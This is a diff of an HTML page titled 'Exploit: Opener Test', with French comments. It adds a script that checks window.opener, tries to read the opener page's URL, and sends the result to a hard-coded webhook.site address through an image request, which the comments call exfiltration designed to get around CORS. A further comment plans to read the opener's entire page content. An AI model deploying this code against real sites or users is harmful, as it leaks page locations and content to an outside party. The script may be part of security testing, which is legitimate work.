@@ -1,11 +1,42 @@
-
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Exploit: Opener Test</title>
+</head>
 <body>
-<a href="https://yassben-cyber.github.io/RHMTEK/css" target="_blank">
-  Ouvrir dans un nouvel onglet
-</a>
-</body>
+    <h1>Testing window.opener</h1>
+    <script>
+        // Remplacez cette URL par l'URL de votre Webhook (ex: webhook.site)
+        const WEBHOOK_URL = "https://webhook.site/4db1d479-fbc4-4653-ba1a-7ac13098605b";
 
+        let result = "";
+        
+        // 1. Vérifier si window.opener existe et n'est pas nul
+        if (window.opener) {
+            result = "SUCCESS: window.opener is NOT null.";
+            
+            // Essayer de voir si on a accès en lecture (Same-Origin) ou si on est bloqué par le Cross-Origin
+            try {
+                let openerUrl = window.opener.location.href;
+                result += " | Opener location: " + openerUrl;
+            } catch (e) {
+                result += " | Impossible de lire le contenu (Cross-Origin bloqué).";
+            }
+        } else {
+            result = "FAILURE: window.opener is null.";
+        }
+
+        // Affichage local pour le debug
+        document.body.innerHTML += "<p>" + result + "</p>";
+
+        // 2. Exfiltration vers le webhook via une requête GET (Image) pour éviter les problèmes de CORS
+        new Image().src = WEBHOOK_URL + "?data=" + encodeURIComponent(result);
+        
+        /* 
+         * Note pour la suite: si tu as l'accès en lecture (Same-Origin), 
+         * on pourra lire le DOM de la page avec: window.opener.document.body.innerHTML
+         */
+    </script>
+</body>
 </html>
